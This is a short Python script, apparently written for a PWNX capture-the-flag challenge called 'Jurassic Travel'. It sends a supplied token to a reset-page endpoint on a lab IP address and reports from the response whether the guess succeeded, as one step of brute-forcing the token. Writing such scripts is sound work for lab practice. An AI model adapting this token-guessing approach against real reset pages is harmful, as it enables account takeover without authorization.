#!/bin/env python3

import re
import requests
import argparse
from colorama import Fore, Style

parser = argparse.ArgumentParser(prog='bruteforce', description='BruteForce Jurassic Travel PWNX')
parser.add_argument('-t', '--token', required=True)
parser.add_argument('-s', '--submit', default='check')
parser.add_argument('-v', '--verbose', action='store_true', default=False)

args = parser.parse_args()


host='http://10.10.10.6/r3s3t_t1m3M4ch1N3.php'

response = requests.post(host, data={'token': args.token, 'submit':args.submit})
if args.verbose:
    print(response.text)

if re.search(r'Omg! This epoch is dangerous! Better retry.', response.text):
    print(Fore.RED + '[-] fail' + Style.RESET_ALL)
else:
    print(Fore.GREEN + '[*] success' + Style.RESET_ALL)
